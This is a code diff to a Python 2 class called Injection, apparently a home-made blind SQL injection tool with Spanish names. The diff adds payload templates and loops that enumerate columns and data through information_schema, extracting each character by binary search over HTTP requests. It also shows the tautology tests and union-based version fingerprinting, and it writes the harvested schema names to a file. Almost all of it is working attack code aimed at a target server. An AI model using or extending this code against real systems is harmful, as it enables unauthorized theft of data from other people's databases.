@@ -37,7 +37,9 @@ class Injection:
 		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
 		'bases':["lol" , "'" , "AND ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , "-- -+"],
 		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , "-- -+"],
-		'tablas':["'" , " and   ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , "-- -+"]
+		'tablas':["'" , " and   ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , "-- -+"],
+		'columnas':["'" , " and   ascii(substring((SELECT column_name FROM information_schema.columns "  ,  "limit 1 offset "  ,"))" , "-- -+"],
+		'datos':["'" , " and   ascii(substring((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+"]
 
 	}
 	catalogoPostgres={
@@ -97,7 +99,7 @@ class Injection:
 		
 		
 		caracter = chr(Injection.getMid(up,down))
-		print "up: ",up," car: ",ord(caracter)," down:",down
+		#print "up: ",up," car: ",ord(caracter)," down:",down
 		if tipo == "version":
 			coord = str(fila)+","+str(columna)
 			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
@@ -110,9 +112,11 @@ class Injection:
 		elif tipo == "tablas":
 			coord = "," + str(fila)+",1"
 			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
+		elif tipo == "columnas":
+			coord = "," + str(fila)+",1"
+			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
 
-
-		print "Coordenada: "+coord
+		#print "Coordenada: "+coord
 		#print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
 		consulta = requests.get(url=direccion+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 		if consulta.text == ok:
@@ -120,19 +124,19 @@ class Injection:
 		elif (consulta.text != ok) and (up == down ):
 			return "No encontrado"
 		else:
-			print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
+			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
 
 			consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 
 				
 			if consulta2.text == ok:
-				print "iguales"
-				print "up: ",up," down(car): ",ord(caracter)
-				print ""
+				#print "iguales"
+				#print "up: ",up," down(car): ",ord(caracter)
+				#print ""
 				return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where)
 			else:
-				print "up(car): ",ord(caracter)," down:",down
-				print ""
+				#print "up(car): ",ord(caracter)," down:",down
+				#print ""
 				down2=down
 				if (down2 + 1) == ord(caracter):
 					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where)
@@ -157,8 +161,8 @@ class Injection:
 				print "Query ",tauto
 				tautosidad = requests.get(url=self.server+"' and 1=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
 				tautosidad2 = requests.get(url=self.server+"' and 1=1 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
-				print tautosidad.text
-				print tautosidad2.text
+				#print tautosidad.text
+				#print tautosidad2.text
 				if (tautosidad.text != pagina.text and tautosidad2.text == pagina.text):
 					PGSQLoMySQL = requests.get(url=self.server+"' union select @@version -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
 #					print "!",PGSQLoMySQL.text," !! ",pagina.text
@@ -239,7 +243,62 @@ class Injection:
 									indiceX = indiceX + 1
 									bandera = indiceY
 									indiceY = 1
+							f = open("datos.txt",'w');
+							f.write("\nCurrent Database: "+current+"\n")
+							f.write("Version: "+version+"\n")
+							#f.write(bases)
+							f.write("\n")
+							f.close()
+							#f.close()
+							#print bases[:len(bases)-1]
+							
 
+####============Datos============
+							print "Datos:"
+							indiceY	= 1
+							indiceX = 0
+							bandera = 0
+							tabla = ""
+							f = open("datos.txt",'w');
+							for where in bases.keys():
+								tablaCol=['']
+								if where != "information_schema" and where != "mysql" and where != "performance_schema":
+									for table in bases[where]:
+							#			columnas = 0
+							#			consulta3 = requests.get(url=self.server+"' and substring((select count(*) from information_schema.columns where table_name ='"+table+"' and table_schema = '"+where+"'),1,1)=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
+							#			while consulta3.text  != pagina.text:
+							#				columna = columna +1
+							#				consulta3 = requests.get(url=self.server+"' and substring((select count(*) from information_schema.columns where table_name ='"+table+"' and table_schema = '"+where+"'),1,1)="+columna+"-- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
+										bandera = 0
+										indiceY	= 1
+										indiceX = 0
+										columna = ""	
+										condicion = "WHERE table_schema = '"+where+"' and table_name = '"+table+"'"
+										#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
+										while char == "No encontrado" and bandera != 1:
+											char = ""
+											print "lol"
+											while char != "No encontrado":
+												
+												char =self.busqueda(self,self.catalogoMySQL,"columnas",pagina.text,126,32,indiceY,indiceX,condicion)
+												print "Caracter: "+char
+												if char != "No encontrado":
+													columna += char
+													indiceY = indiceY +1
+											tablaCol.append(columna)
+											if where != '' and table != '' and columna != '':
+												print "Base: "+where+" Tabla:"+table+" columnas: "+columna
+												f.write("Base: "+where+" Tabla:"+table+" columnas: "+columna+"\n");
+												
+
+
+
+
+											
+											columna = ""
+											indiceX = indiceX + 1
+											bandera = indiceY
+											indiceY = 1
 
 
 
@@ -251,6 +310,7 @@ class Injection:
 							print "Version: "+version
 							#print bases[:len(bases)-1]
 							print bases
+							f.close()
 
 						else:
 							database = "mssql"
